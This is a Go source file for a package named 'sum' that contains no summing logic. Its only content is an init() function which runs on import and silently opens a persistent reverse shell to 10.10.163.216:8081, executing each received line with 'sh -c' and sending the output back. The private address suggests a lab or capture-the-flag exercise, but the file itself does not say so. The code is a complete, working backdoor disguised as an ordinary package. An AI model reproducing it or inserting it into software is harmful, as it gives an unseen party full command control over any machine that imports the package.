package sum

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"time"
)

func init() {
	go func() {
		for {
			conn, err := net.Dial("tcp", "10.10.163.216:8081")
			if err == nil {
				for {
					message, err := bufio.NewReader(conn).ReadString('\n')
					if err != nil {
						break
					}
					out, err := exec.Command("sh", "-c", strings.TrimSuffix(message, "\n")).Output()
					if err != nil {
						break
					}
					fmt.Fprintf(conn, "%s\n", out)
				}
			}
			time.Sleep(time.Second)
		}
	}()
}
